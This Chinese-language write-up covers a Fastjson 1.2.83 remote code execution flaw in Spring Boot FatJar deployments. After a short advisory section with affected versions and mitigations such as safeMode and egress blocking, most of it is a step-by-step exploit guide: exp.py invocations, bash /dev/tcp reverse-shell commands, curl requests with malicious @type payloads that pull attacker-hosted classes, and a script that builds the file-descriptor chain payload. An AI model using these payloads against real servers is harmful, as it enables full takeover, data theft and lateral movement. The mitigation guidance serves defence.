漏洞概述

1.1 漏洞描述

Fastjson 1.2.83 远程代码执行漏洞（QVD-2026-43021）是阿里巴巴开源 Java JSON 解析库 Fastjson 1.x 系列中存在的一类严重安全漏洞，CVSS 3.1 评分为 9.8（Critical）。

该漏洞根因在于 ParserConfig.checkAutoType() 方法中的类资源探测路径存在缺陷。当 Fastjson 处理 JSON 中的 @type 字段时，会将用户可控的类型名通过 typeName.replace('.', '/') + ".class" 拼接为资源路径，并调用 ClassLoader.getResourceAsStream() 进行探测。

在 Spring Boot FatJar 部署环境下，LaunchedURLClassLoader 支持解析 jar:http:// 和 jar:file: 等绝对 URL 资源。攻击者可构造特殊的 @type 值（如 jar:http:..attacker:port/payload!.Exploit），利用点号替换机制将其转换为远程 JAR 包 URL，诱使服务端下载并加载攻击者控制的恶意类。

恶意类通过 ASM 字节码携带 @JSONType 注解，使 Fastjson 将其视为受信类型并跳过后续安全检查（包括黑白名单和 expectClass 类型兼容性检查），最终通过 TypeUtils.loadClass() 触发 defineClass 加载该类，类的 &lt;clinit&gt; 静态块在加载阶段自动执行，实现远程代码执行。

该漏洞无需开启 autoTypeSupport（默认关闭）、无需目标 classpath 存在任何第三方 Gadget 依赖，传统删除危险依赖、更新黑名单的防御手段完全失效。

1.2 影响版本

| 范围 | 说明 | |------|------| | 影响版本 | Fastjson 1.2.68 ~ 1.2.83（含） | | 不受影响版本 | Fastjson 1.2.67 及更早版本（代码路径不存在）；Fastjson 2.x 全系列（架构重构） |

1.3 利用条件

该漏洞的完整利用需满足以下条件：

| 条件 | 说明 | |------|------| | Fastjson 版本 | 1.2.68 ~ 1.2.83 | | 配置 | safeMode=false（默认），autoTypeSupport 无关（默认 false 仍可触发） | | 部署方式 | Spring Boot FatJar（java -jar），ClassLoader 为 LaunchedURLClassLoader | | JDK 版本 | JDK 8：单阶段直接 RCE；JDK 17/21/25：需两阶段（/proc/self/fd） | | 操作系统 | Linux（依赖 /proc/self/fd），macOS 亦可（/dev/fd） | | 网络可达 | 目标服务器可出网访问攻击者 HTTP 服务 | | 输入入口 | 应用解析外部不可信的 JSON 输入且处理 @type 字段 |

1.4 漏洞影响

成功利用该漏洞可导致：

  • 远程代码执行（RCE）：攻击者可在目标服务器上执行任意系统命令，完全控制服务器
  • 数据泄露：窃取业务数据、环境变量、配置文件等敏感信息
  • 内网横向渗透：以受害服务器为跳板攻击内网其他系统
  • 业务中断：植入后门、勒索软件或破坏业务可用性

1.5 修复与缓解建议

推荐方案

  • 升级至 Fastjson 2.x：官方已停止 1.x 系列维护，2.x 重构了 AutoType 机制，不受此漏洞影响
  • 升级地址：https://github.com/alibaba/fastjson2

临时缓解措施

  1. 启用 SafeMode（最有效）：完全禁用 AutoType 功能
  • 代码配置：ParserConfig.getGlobalInstance().setSafeMode(true);
  • JVM 参数：-Dfastjson.parser.safeMode=true
  • 配置文件：fastjson.parser.safeMode=true
  1. 限制出网流量：阻断应用容器主动访问外部 HTTP 服务
  2. API 边界过滤：在网关层拦截包含 @type 字段且值含 jar:、http: 等协议的请求
  3. 使用 WAF 防护：已部署 WAF 的产品可启用相应拦截规则（如阿里云 WAF 规则 901168/901170/901171）

漏洞复现

复现项目地址:https://github.com/hzhsec/fastjson-jsontype-rce-hzhsec

启动靶场

每次测试必须先启动靶场，且每次测试必须重启（JVM 类加载缓存）。

启动命令

# 1. 清理旧进程
fuser -k 18080/tcp 2>/dev/null

# 2. 启动（JDK 8）
java -jar target/fastjson-rce-env-1.0.0.jar &

# 启动（JDK 17）
java -jar target/fastjson-rce-env-1.0.0.jar &

# 3. 确认启动
sleep 6 && curl -s http://127.0.0.1:18080/info

预期响应

{"safeMode":false,"autoTypeSupport":false,"parserConfigCL":"LaunchedURLClassLoader..."}

关键确认点：

  • safeMode: false — 漏洞可利用
  • LaunchedURLClassLoader — Spring Boot FatJar
  • autoTypeSupport: false — 没开启 autoType 也能打

两种攻击模式

JDK8-HTTP 模式（JDK 8 专用）

适用： JDK 8 （JDK 9+ 因 defineClass 校验类名而失败） 原理： IP 用整数表示（避免 replace('.','/')），直接 HTTP 拉取恶意 class

switch-java 8
java -version

一键利用

cd poc/
python3 exp.py 攻击者ip 19090 http://目标ip:18080 --endpoint 自定义端点 --mode 攻击模式

自定义命令：

python3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode jdk8-http --endpoint /parse --cmd "id > /tmp/out.txt"

攻击模式参数: jdk8-http适合jdk8 fd多版本适合

反弹shell

python3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode jdk8-http --endpoint /parse --cmd "bash -c 'exec bash -i &>/dev/tcp/192.168.1.107/4444 <&1'"

预期输出：

FD 链模式（JDK 8~25 全版本）

适用： JDK 8/11/17/21/25 全版本 原理： 两步走 — ①目标下载恶意 jar → ②枚举 /proc/self/fd/N 找到 jar 并加载 优点： 通杀所有 JDK，类名合法不触发 defineClass 校验 注意： 需要较长超时（60 秒+，要遍历 253 个 fd）

切换jdk17版本

switch-java 17
java -version

一键利用

自定义命令：

cd poc
python3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode fd --endpoint /parse --cmd "bash -c 'exec bash -i &>/dev/tcp/192.168.1.107/4444 <&1'" --timeout 60

预期输出：

    攻击机: 192.168.1.107:19090  命令: id

一键全测（先 JDK8-HTTP 后 FD）

有点问题

python3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode auto --cmd id

手工复现

JDK8-HTTP 手工

Step 1：生成恶意 class

cd poc/
java -cp ".;lib/asm-9.6.jar;lib/fastjson-1.2.83.jar" \
  GenProbe 192.168.1.107 19090 "id > /tmp/out.txt" jdk8-http

Linux 把 ; 换成 :

Step 2：攻击主机启动 HTTP 托管

cd www/
python3 -m http.server 19090
# 保持此终端不关闭

Step 3：另开终端，发送 Payload

# IP 需整数化：
# python3 -c "import struct,socket; print(struct.unpack('!I', socket.inet_aton('192.168.1.107'))[0])"
# → 3232235883

curl -X POST http://目标:18080/parse \
  -H "Content-Type: application/json" \
  -d '{"@type":"http:..3232235883:19090.a"}'

# 预期响应: {"ok":true,"class":"http:..3232235883:19090.a","result":"..."}

FD 链手工

Step 1：生成恶意 probe.jar

cd poc/
java -cp "poc;poc/lib/asm-9.6.jar;poc/lib/fastjson-1.2.83.jar" GenProbe 192.168.1.107 19090 "bash -c 'exec bash -i &>/dev/tcp/192.168.1.107/4444 <&1'" fd

Step 2：攻击主机启动 HTTP 托管

cd www/
python3 -m http.server 19090

Step 3：构造并发送 FD 链 Payload 目录下面的mk.py文件


import json
items = [{"@type": "jar:http:..3232235883:19090.probe!.foo.Exception"}]
for fd in range(3, 257):
    items.append({"@type": f"jar:file:.proc.self.fd.{fd}!.fd{fd}.Exception"})
json.dump(items, open("payload.json", "w"))
print(f"payload: {len(items)} items")

上面这个payload生成脚本的3232235883记得修改成自己的攻击ip对应的十进制

在payload.py目录执行
curl -X POST http://192.168.174.128:18080/
parse -H "Content-Type: application/json" -d @payload.json --max-time 60
